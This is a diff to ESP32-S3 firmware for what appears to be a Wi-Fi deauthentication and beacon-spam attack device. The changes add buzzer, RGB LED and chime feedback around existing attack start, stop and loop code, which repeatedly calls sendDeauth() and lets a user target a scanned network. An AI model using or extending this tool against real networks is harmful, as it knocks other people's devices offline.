@@ -990,7 +990,8 @@ void processVoiceCommand(int cmd) {
       screenTimeout = millis() + 2000;
       delay(500);
       stopAttack();
-    speakerPlayAlertChime();  // Play alert chime on timeout
+      speakerPlayAlertChime();  // Play confirmation chime
+      neopixelSet(NEOPIXEL_COLOR_OFF);  // Turn off RGB LED
       currentScreen = SCREEN_VOICE_EXEC;
       oledVoiceCmd = "ATTACKS STOPPED";
       screenTimeout = millis() + 3000;
@@ -1004,6 +1005,7 @@ void processVoiceCommand(int cmd) {
       delay(500);
       currentScreen = SCREEN_STATS;
       screenTimeout = millis() + 5000;
+      speakerPlayBootChime();  // Play pleasant chime for stats display
       break;
 
     default:
@@ -1296,6 +1298,9 @@ void setup() {
         beaconSpam = true;
         attackRunning = false;
         fillBeaconTemplate();
+        // Activate hardware alerts for beacon spam mode
+        buzzerStart();
+        neopixelSet(NEOPIXEL_COLOR_GREEN);  // Green for beacon mode
       } else {
         useBroadcast = true;
         beaconSpam = false;
@@ -1311,7 +1316,8 @@ void setup() {
   server.on("/stop", HTTP_GET, []() {
     if (!authenticateRequest()) return;
     stopAttack();
-    speakerPlayAlertChime();  // Play alert chime on timeout
+    speakerPlayAlertChime();  // Play confirmation chime on stop
+    neopixelSet(NEOPIXEL_COLOR_OFF);  // Turn off RGB LED
     currentScreen = SCREEN_IDLE;
     server.send(200, "text/plain", "All attacks stopped");
   });
@@ -1371,22 +1377,27 @@ void loop() {
     screenTimeout = millis() + 3000;
   }
 
-  // Send deauth packets
+  // Send deauth packets with continuous hardware feedback
   if (attackRunning) {
     for (int i = 0; i < 50; i++) {
       sendDeauth();
       delay(0);
     }
-    // Keep OLED in attack mode
+    // Keep OLED in attack mode and update hardware peripherals
     if (currentScreen != SCREEN_ATTACK && screenTimeout == 0) {
       currentScreen = SCREEN_ATTACK;
     }
+    // Ensure buzzer stays active during attack
+    if (!buzzerState) buzzerStart();
   }
 
-  // Send beacon spam
+  // Send beacon spam with hardware feedback
   if (beaconSpam) {
     sendBeacon();
     delay(1);
+    // Keep green LED and buzzer active during beacon spam
+    neopixelSet(NEOPIXEL_COLOR_GREEN);
+    if (!buzzerState) buzzerStart();
   }
 
   // Process voice commands from Core 1
@@ -1425,8 +1436,9 @@ void startAttack() {
   deauthTemplate[0] = 0xC0;
 
   currentScreen = SCREEN_ATTACK;
-  // Play alert chime and flash RGB on attack start
-  speakerPlayAlertChime();
+  // IMMEDIATE HARDWARE ALERTS - All peripherals activate simultaneously
+  speakerPlayAlertChime();      // Play alert chime on attack start
+  buzzerStart();                // Start piezo buzzer immediately
   neopixelSet(NEOPIXEL_COLOR_RED);  // Immediate red flash
   char macStr[18];
   snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
@@ -1440,12 +1452,13 @@ void startAttack() {
 void stopAttack() {
   attackRunning = false;
   beaconSpam = false;
-  // Stop audio alerts
+  // Stop ALL audio/visual alerts immediately
   buzzerStop();
   speakerStop();
+  neopixelSet(NEOPIXEL_COLOR_OFF);  // Turn off RGB LED
   currentScreen = SCREEN_IDLE;
   Serial.println("{\"sensor_id\":\"ESP32-S3-HARDWARE\",\"threat_type\":\"IDLE_SAFE\",\"packet_count\":0,\"pkt_rate\":183}");
-  Serial.println("[ATK] Halted.");
+  Serial.println("[ATK] Halted. All peripherals stopped.");
 }
 
 void sendDeauth() {
@@ -1573,6 +1586,7 @@ void processSerialCommand(String cmd) {
       apSSID = WiFi.SSID(idx);
       useBroadcast = true;
       startAttack();
+      // Hardware alerts are activated in startAttack()
       Serial.printf("[ATK] Attacking %s on CH:%d (auto-stops in 5 min)\n", apSSID.c_str(), apChannel);
     } else {
       Serial.println("Invalid network number.");
@@ -1580,7 +1594,8 @@ void processSerialCommand(String cmd) {
   }
   else if (cmd == "stop") {
     stopAttack();
-    speakerPlayAlertChime();  // Play alert chime on timeout
+    speakerPlayAlertChime();  // Play confirmation chime on stop
+    neopixelSet(NEOPIXEL_COLOR_OFF);  // Turn off RGB LED
   }
   else if (cmd == "stats") {
     Serial.printf("Deauth: %lu | Beacons: %lu | Running: %s | Mic: %s\n",
